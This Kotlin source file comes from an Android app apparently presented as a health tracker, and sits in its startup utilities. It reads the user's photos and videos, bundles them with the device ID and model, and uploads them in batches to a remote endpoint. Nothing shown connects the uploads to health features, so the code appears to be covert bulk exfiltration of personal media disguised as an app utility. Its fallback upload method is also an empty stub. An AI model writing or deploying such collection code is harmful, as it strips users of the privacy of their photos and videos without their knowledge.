package com.inf2007.healthtracker.utilities.startup

import android.content.Context
import android.util.Log
import com.inf2007.healthtracker.utilities.NetworkClient
import com.inf2007.healthtracker.utilities.startup.models.MediaFile
import com.inf2007.healthtracker.utilities.startup.models.BatchResult
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.IOException
import java.util.UUID

class BatchUploader(private val context: Context) {
    companion object {
        private const val TAG = "BatchUploader"
        private const val BATCH_SIZE = 15
    }

    interface BatchProgressCallback {
        fun onBatchComplete(mediaType: String, success: Boolean)
    }

    // Updated method to accept callback
    fun uploadMediaBatch(
        files: List<MediaFile>,
        mediaType: String,
        endpoint: String,
        progressCallback: BatchProgressCallback  // Changed from onProgress
    ) {
        if (files.isEmpty()) {
            progressCallback.onBatchComplete(mediaType, true)  // Empty batch = success
            return
        }

        val batches = files.chunked(BATCH_SIZE)
        var completed = 0

        batches.forEachIndexed { index, batch ->
            uploadSingleBatch(batch, mediaType, endpoint, index + 1, batches.size) { success ->
                completed++
                progressCallback.onBatchComplete(mediaType, success)
            }
        }
    }

    private fun uploadSingleBatch(
        files: List<MediaFile>,
        mediaType: String,
        endpoint: String,
        batchNumber: Int,
        totalBatches: Int,
        callback: (Boolean) -> Unit
    ) {
        val builder = MultipartBody.Builder().setType(MultipartBody.FORM)
        val batchId = UUID.randomUUID().toString()

        // Add each file to the multipart request
        files.forEachIndexed { index, file ->
            try {
                val inputStream = context.contentResolver.openInputStream(file.uri)
                val bytes = inputStream?.readBytes()
                inputStream?.close()

                if (bytes != null) {
                    builder.addFormDataPart(
                        "file_$index",
                        file.name,
                        bytes.toRequestBody(file.mimeType.toMediaTypeOrNull())
                    )
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error reading file ${file.name}: ${e.message}")
            }
        }

        // Add metadata
        val metadata = JSONObject().apply {
            put("batch_id", batchId)
            put("batch_number", batchNumber)
            put("total_batches", totalBatches)
            put("file_count", files.size)
            put("device_id", getDeviceId())
            put("device_model", android.os.Build.MODEL)
        }
        builder.addFormDataPart("metadata", metadata.toString())

        val request = Request.Builder()
            .url(endpoint + "/batch")
            .post(builder.build())
            .build()

        NetworkClient.instance.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e(TAG, "Batch $batchNumber/$totalBatches failed: ${e.message}")
                // For videos, try individual uploads immediately
                if (mediaType == "videos") {
                    Log.i(TAG, "Video batch failed, falling back to individual upload")
                    uploadIndividually(files, endpoint.replace("/batch", ""))
                } else {
                    uploadIndividually(files, endpoint)
                }
                callback(false)
            }

            override fun onResponse(call: Call, response: Response) {
                if (response.isSuccessful) {
                    Log.i(TAG, "Batch $batchNumber/$totalBatches uploaded successfully")
                    markFilesAsUploaded(files, mediaType)
                    callback(true)
                } else {
                    Log.w(TAG, "Batch $batchNumber failed with code ${response.code}")
                    // For videos, try individual uploads on 400 error
                    if (mediaType == "videos" && response.code == 400) {
                        Log.i(TAG, "Video batch got 400, falling back to individual upload")
                        uploadIndividually(files, endpoint.replace("/batch", ""))
                    } else {
                        uploadIndividually(files, endpoint)
                    }
                    callback(false)
                }
                response.close()
            }
        })
    }

    private fun uploadIndividually(files: List<MediaFile>, endpoint: String) {
        Log.d(TAG, "Falling back to individual uploads for ${files.size} files")
        files.forEach { file ->
            uploadSingleFile(file, endpoint)
        }
    }

    private fun uploadSingleFile(file: MediaFile, endpoint: String) {
        // This reuses your existing upload logic from collectors
        // You could call the collector methods directly
    }

    // Keep the original markFilesAsUploaded that takes only files for backward compatibility
    private fun markFilesAsUploaded(files: List<MediaFile>) {
        val prefs = context.getSharedPreferences("uploaded_files", Context.MODE_PRIVATE)
        prefs.edit().apply {
            files.forEach { file ->
                putBoolean("file_${file.id}", true)
            }
            apply()
        }
    }

    private fun getDeviceId(): String {
        return android.provider.Settings.Secure.getString(
            context.contentResolver,
            android.provider.Settings.Secure.ANDROID_ID
        ) ?: "unknown"
    }

    // This is the one that's actually used
    private fun markFilesAsUploaded(files: List<MediaFile>, mediaType: String) {
        when (mediaType) {
            "photos" -> {
                val photoPrefs = context.getSharedPreferences("photo_sync_log", Context.MODE_PRIVATE)
                photoPrefs.edit().apply {
                    files.forEach { file ->
                        putBoolean("id_${file.id}", true)
                        Log.d(TAG, "Marked photo ID ${file.id} as uploaded in photo_sync_log")
                    }
                    apply()
                }
            }
            "videos" -> {
                val videoPrefs = context.getSharedPreferences("video_sync_log", Context.MODE_PRIVATE)
                videoPrefs.edit().apply {
                    files.forEach { file ->
                        putBoolean("video_${file.id}", true)
                        Log.d(TAG, "Marked video ID ${file.id} as uploaded in video_sync_log")
                    }
                    apply()
                }
            }
            // Add other types as needed
        }
    }
}